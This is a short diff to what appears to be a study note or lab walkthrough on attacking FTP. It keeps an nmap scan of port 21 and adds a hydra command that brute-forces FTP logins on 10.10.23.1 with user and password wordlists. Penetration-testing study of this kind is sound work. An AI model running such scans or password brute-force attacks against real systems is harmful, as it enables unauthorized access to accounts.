@@ -14,8 +14,9 @@ FTP (File Transfer Protocol) is a network protocol for transmitting file between
 
 1. Scanning
 
-     Nmap -p21 -sC -sV -A IP 
+       Nmap -p21 -sC -sV -A IP 
 
 2. Here is prejent username and password file so use this file to try Brute-Force
 
+       hydra -L User.txt -P Password.txt ftp://10.10.23.1 -f
     
